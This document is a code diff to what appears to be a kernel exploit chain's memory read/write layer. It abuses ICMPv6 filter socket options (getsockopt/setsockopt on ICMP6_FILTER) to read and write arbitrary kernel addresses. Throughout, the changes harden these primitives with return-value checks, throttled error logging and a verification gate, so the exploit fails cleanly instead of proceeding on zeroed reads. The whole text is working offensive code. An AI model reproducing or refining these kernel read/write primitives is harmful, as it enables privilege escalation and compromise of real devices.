@@ -35,13 +35,16 @@ static bool cs2_set_target_kaddr(uint64_t where) {
     return true;
 }
 
-void cs2_early_kreadbuf(uint64_t where, void *readBuf, size_t size)
+/* LSWCHAIN: returns false when the read did not actually happen. The old
+   void form left the caller unable to tell a dead lane from a live one —
+   on the 12 that meant every downstream probe "succeeded" on zeros. */
+bool cs2_early_kreadbuf(uint64_t where, void *readBuf, size_t size)
 {
     //printf("kreadbuf %#llx %p %#lx\n", where, readBuf, size); fflush(stdout); usleep(10000);
-    
+
     if (size > CS2_EARLY_KRW_LENGTH) {
         LOG_ERR("error: (size > CS2_EARLY_KRW_LENGTH)\n");
-        return;
+        return false;
     }
     
     uint64_t real_end = where + CS2_EARLY_KRW_LENGTH - 1;
@@ -59,18 +62,30 @@ void cs2_early_kreadbuf(uint64_t where, void *readBuf, size_t size)
         { static uint64_t rb_err_logs = 0;
           if (rb_err_logs++ < 2 || (rb_err_logs % 5000) == 0)
             LOG_ERR("cs2_early_kreadbuf: failed to set target kaddr\n"); }
-        return;
+        return false;
     }
     uint8_t tmpBuf[CS2_EARLY_KRW_LENGTH];
-    
+    memset(tmpBuf, 0, sizeof(tmpBuf));
+
     socklen_t read_data_length = CS2_EARLY_KRW_LENGTH;
     int res = getsockopt(cs2_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuf, &read_data_length);
     if (res != 0) {
-        LOG_ERR("getsockopt failed!!!\n");
-        return;
+        { static uint64_t rb_getsock_logs = 0;
+          if (rb_getsock_logs++ < 2 || (rb_getsock_logs % 5000) == 0)
+            LOG_ERR("cs2_early_kreadbuf: getsockopt failed (%d)\n", errno); }
+        return false;
     }
-    
+
     memcpy(readBuf, &tmpBuf[offset], size);
+    return true;
+}
+
+int cs2_early_kread64_ok(uint64_t where, uint64_t *out)
+{
+    uint64_t value = 0;
+    if (!cs2_early_kreadbuf(where, &value, sizeof(value))) return -1;
+    if (out) *out = value;
+    return 0;
 }
 
 uint64_t cs2_early_kread64(uint64_t where)
@@ -80,11 +95,11 @@ uint64_t cs2_early_kread64(uint64_t where)
     return value;
 }
 
-void cs2_early_kwritebuf(uint64_t where, void *writeBuf, size_t size)
+bool cs2_early_kwritebuf(uint64_t where, void *writeBuf, size_t size)
 {
     if (size > CS2_EARLY_KRW_LENGTH) {
         LOG_ERR("error: (size > CS2_EARLY_KRW_LENGTH)\n");
-        return;
+        return false;
     }
     
     uint64_t real_end = where + CS2_EARLY_KRW_LENGTH - 1;
@@ -96,35 +111,45 @@ void cs2_early_kwritebuf(uint64_t where, void *writeBuf, size_t size)
         offset = (CS2_EARLY_KRW_LENGTH - size);
     }
     uint8_t tmpBuf[CS2_EARLY_KRW_LENGTH];
-    cs2_early_kreadbuf(where - offset, tmpBuf, CS2_EARLY_KRW_LENGTH);
+    if (!cs2_early_kreadbuf(where - offset, tmpBuf, CS2_EARLY_KRW_LENGTH)) return false;
     memcpy(&tmpBuf[offset], writeBuf, size);
 
     if (!cs2_set_target_kaddr(where - offset)) {
         { static uint64_t wb_err_logs = 0;
           if (wb_err_logs++ < 2 || (wb_err_logs % 5000) == 0)
             LOG_ERR("cs2_early_kwritebuf: failed to set target kaddr\n"); }
-        return;
+        return false;
     }
     int res = setsockopt(cs2_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuf, CS2_EARLY_KRW_LENGTH);
     if (res != 0) {
-        LOG_ERR("setsockopt failed!!!\n");
-        return;
+        { static uint64_t wb_set_logs = 0;
+          if (wb_set_logs++ < 2 || (wb_set_logs % 5000) == 0)
+            LOG_ERR("cs2_early_kwritebuf: setsockopt failed (%d)\n", errno); }
+        return false;
     }
+    return true;
 }
 
 void cs2_early_kwrite64(uint64_t where, uint64_t what)
 {
-    cs2_early_kwritebuf(where, &what, sizeof(what));
+    (void)cs2_early_kwritebuf(where, &what, sizeof(what));
 }
 
 int cs2_kreadbuf(uint64_t kaddr, void* output, size_t size)
 {
+    /* ABI kept: 0 = success. -1 = the lane is not verified (no pair, no
+       kbase proof) or a chunk read failed. Never "succeed" on zeros. */
+    if (!cs2_ctx.rw_verified) {
+        { static int once = 0;
+          if (!once++) LOG_ERR("cs2_kreadbuf refused: rw_verified=0 (no proven pair/kbase) — return -1"); }
+        return -1;
+    }
     uint8_t *output8 = (uint8_t *)output;
     size_t bytes_read = 0;
 
     while (bytes_read < size) {
         size_t chunk = (size - bytes_read < CS2_EARLY_KRW_LENGTH) ? (size - bytes_read) : CS2_EARLY_KRW_LENGTH;
-        cs2_early_kreadbuf(kaddr + bytes_read, &output8[bytes_read], chunk);
+        if (!cs2_early_kreadbuf(kaddr + bytes_read, &output8[bytes_read], chunk)) return -1;
         bytes_read += chunk;
     }
     return 0;
@@ -132,12 +157,17 @@ int cs2_kreadbuf(uint64_t kaddr, void* output, size_t size)
 
 int cs2_kwritebuf(uint64_t kaddr, const void* input, size_t size)
 {
+    if (!cs2_ctx.rw_verified) {
+        { static int once = 0;
+          if (!once++) LOG_ERR("cs2_kwritebuf refused: rw_verified=0 (no proven pair/kbase) — return -1"); }
+        return -1;
+    }
     uint8_t *input8 = (uint8_t *)input;
     size_t bytes_written = 0;
 
     while (bytes_written < size) {
         size_t chunk = (size - bytes_written < CS2_EARLY_KRW_LENGTH) ? (size - bytes_written) : CS2_EARLY_KRW_LENGTH;
-        cs2_early_kwritebuf(kaddr + bytes_written, &input8[bytes_written], chunk);
+        if (!cs2_early_kwritebuf(kaddr + bytes_written, &input8[bytes_written], chunk)) return -1;
         bytes_written += chunk;
     }
     return 0;
